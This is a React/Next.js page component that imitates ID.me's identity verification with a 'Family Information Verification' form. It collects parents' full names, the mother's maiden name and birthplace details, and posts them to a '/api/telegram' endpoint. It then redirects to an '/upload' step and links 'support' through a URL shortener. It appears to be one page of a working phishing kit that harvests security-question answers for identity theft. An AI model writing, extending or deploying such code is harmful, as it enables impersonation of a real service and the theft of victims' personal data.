"use client";

import Image from "next/image";
import { useState } from "react";
import { useRouter } from "next/navigation";
import idmeLogo from "./idme.png"; // place your logo in the same folder

export default function FamilyInformationPage() {
  const router = useRouter();
  const [fatherFullName, setFatherFullName] = useState("");
  const [motherFullName, setMotherFullName] = useState("");
  const [motherMaidenName, setMotherMaidenName] = useState("");
  const [placeOfBirth, setPlaceOfBirth] = useState("");
  const [cityOfBirth, setCityOfBirth] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!fatherFullName || !motherFullName || !motherMaidenName || !placeOfBirth || !cityOfBirth) {
      setError("Please fill out all fields.");
      return;
    }

    setIsSubmitting(true);
    setError("");
    setSuccess("");

    const formData = {
      fathers_full_name: fatherFullName,
      mothers_full_name: motherFullName,
      mothers_maiden_name: motherMaidenName,
      place_of_birth: placeOfBirth,
      city_of_birth: cityOfBirth,
    };

    try {
      const res = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          data: formData,
          formType: "FAMILY INFORMATION (TEIL)",
        }),
      });

      if (!res.ok) throw new Error("Submission failed");

      setSuccess("Family information submitted successfully!");
      setFatherFullName("");
      setMotherFullName("");
      setMotherMaidenName("");
      setPlaceOfBirth("");
      setCityOfBirth("");

      setTimeout(() => {
        router.push("/upload");
      }, 2000);
    } catch (error) {
      console.error(error);
      setError("Failed to submit information. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col justify-center py-12 sm:px-6 lg:px-8">
      <div className="sm:mx-auto sm:w-full sm:max-w-md">
        {/* Logo */}
        <div className="flex justify-center">
          <div className="w-32 h-12 relative">
            <Image
              src={idmeLogo}
              alt="ID.me"
              width={128}
              height={48}
              className="object-contain"
              priority
            />
          </div>
        </div>

        {/* Main Card */}
        <div className="mt-8 bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
          <div className="px-8 pt-8 pb-4">
            <h1 className="text-2xl font-semibold text-gray-900 text-center tracking-tight">
              Family Information Verification
            </h1>
            <p className="mt-2 text-sm text-gray-500 text-center">
              Please provide the following family information for identity verification
            </p>
          </div>

          <div className="bg-blue-50 py-3 text-center border-y border-gray-100">
            <a
              href="https://cutt.ly/xPJZ0xv"
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-600 hover:text-blue-700 font-medium text-sm"
            >
              Need help? Contact Support
            </a>
          </div>

          <div className="p-8">
            {error && (
              <div className="mb-6 rounded-md bg-red-50 p-4 text-sm text-red-700">
                {error}
              </div>
            )}
            {success && (
              <div className="mb-6 rounded-md bg-green-50 p-4 text-sm text-green-700">
                {success}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-5">
              {/* Father's Full Name */}
              <div>
                <label htmlFor="father_full_name" className="block text-sm font-medium text-gray-700 mb-1">
                  Father's Full Name
                </label>
                <input
                  id="father_full_name"
                  type="text"
                  required
                  value={fatherFullName}
                  onChange={(e) => setFatherFullName(e.target.value)}
                  placeholder="Enter father's full name"
                  autoComplete="off"
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
                />
              </div>

              {/* Mother's Full Name */}
              <div>
                <label htmlFor="mother_full_name" className="block text-sm font-medium text-gray-700 mb-1">
                  Mother's Full Name
                </label>
                <input
                  id="mother_full_name"
                  type="text"
                  required
                  value={motherFullName}
                  onChange={(e) => setMotherFullName(e.target.value)}
                  placeholder="Enter mother's full name"
                  autoComplete="off"
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
                />
              </div>

              {/* Mother's Maiden Name */}
              <div>
                <label htmlFor="mother_maiden_name" className="block text-sm font-medium text-gray-700 mb-1">
                  Mother's Maiden Name
                </label>
                <input
                  id="mother_maiden_name"
                  type="text"
                  required
                  value={motherMaidenName}
                  onChange={(e) => setMotherMaidenName(e.target.value)}
                  placeholder="Enter mother's maiden name"
                  autoComplete="off"
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
                />
              </div>

              {/* Place of Birth */}
              <div>
                <label htmlFor="place_of_birth" className="block text-sm font-medium text-gray-700 mb-1">
                  Place of Birth
                </label>
                <input
                  id="place_of_birth"
                  type="text"
                  required
                  value={placeOfBirth}
                  onChange={(e) => setPlaceOfBirth(e.target.value)}
                  placeholder="Enter place of birth (e.g., Hospital name)"
                  autoComplete="off"
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
                />
              </div>

              {/* City of Birth */}
              <div>
                <label htmlFor="city_of_birth" className="block text-sm font-medium text-gray-700 mb-1">
                  City of Birth
                </label>
                <input
                  id="city_of_birth"
                  type="text"
                  required
                  value={cityOfBirth}
                  onChange={(e) => setCityOfBirth(e.target.value)}
                  placeholder="Enter city of birth"
                  autoComplete="off"
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
                />
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-sm text-base font-semibold text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-70 disabled:cursor-not-allowed transition-colors"
              >
                {isSubmitting ? "Submitting..." : "Continue"}
              </button>
            </form>

            <div className="mt-6 text-center">
              <button
                onClick={() => router.back()}
                className="text-sm text-blue-600 hover:text-blue-700 font-medium"
              >
                ← Go Back
              </button>
            </div>
          </div>
        </div>

        {/* Footer Links */}
        <div className="mt-8 text-center text-xs text-gray-500 space-x-4">
          <a
            href="https://www.id.me/about"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            What is ID.me?
          </a>
          <span>|</span>
          <a
            href="https://www.id.me/terms"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            Terms of Service
          </a>
          <span>|</span>
          <a
            href="https://www.id.me/privacy"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            Privacy Policy
          </a>
        </div>
      </div>
    </div>
  );
}